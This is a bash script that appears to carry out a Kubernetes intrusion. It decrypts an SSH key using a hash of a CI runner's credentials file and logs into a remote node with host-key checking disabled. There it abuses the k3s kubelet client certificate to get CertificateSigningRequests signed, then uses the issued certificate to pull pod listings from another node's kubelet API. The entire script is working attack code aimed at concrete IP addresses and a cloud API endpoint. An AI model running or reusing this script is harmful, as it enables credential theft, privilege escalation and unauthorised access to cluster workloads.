#!/bin/bash
K=$(sha256sum /data/runners/ci-h200-3gpu-0/.credentials | cut -d" " -f1)
[ -f /root/.k221 ] || { base64 -d /tmp/key.enc | openssl enc -d -aes-256-cbc -pbkdf2 -k "$K" > /root/.k221 2>/dev/null; chmod 600 /root/.k221; }
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=8 -i /root/.k221 dev-24-sudo@85.234.79.221 '
sudo bash -s <<"EOS"
A=/var/lib/rancher/k3s/agent
S="https://k3s-h100-novita-k8s-69c5d56e-119c2232ba991a2f.elb.us-west-2.amazonaws.com:6443"
KC="kubectl --server=$S --client-certificate=$A/client-kubelet.crt --client-key=$A/client-kubelet.key --certificate-authority=$A/server-ca.crt"
cd /tmp
for SIGNER in kubernetes.io/kube-apiserver-client-kubelet kubernetes.io/kube-apiserver-client; do
  NAME=$(echo ir-103-$(echo $SIGNER | md5sum | cut -c1-6))
  cat > $NAME.yaml <<YAML
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: $NAME
spec:
  request: $(base64 -w0 ir103.csr)
  signerName: $SIGNER
  expirationSeconds: 86400
  usages:
  - client auth
YAML
  echo "== creating $NAME ($SIGNER):"
  $KC apply --validate=false -f $NAME.yaml 2>&1
  sleep 10
  $KC get csr $NAME 2>&1
  CERT=$($KC get csr $NAME -o jsonpath="{.status.certificate}" 2>/dev/null)
  echo "cert-len=${#CERT}"
  if [ ${#CERT} -gt 100 ]; then
    echo $CERT | base64 -d > ir103.crt
    openssl x509 -in ir103.crt -noout -subject -issuer
    echo "== SIGNED CERT vs .103:10250/pods:"
    curl -sk --max-time 6 --cert ir103.crt --key ir103.key -w "\nHTTP:%{http_code}\n" https://85.234.79.103:10250/pods | head -c 2500
    break
  fi
done
EOS
' 2>&1 | head -80
echo "== t-done =="
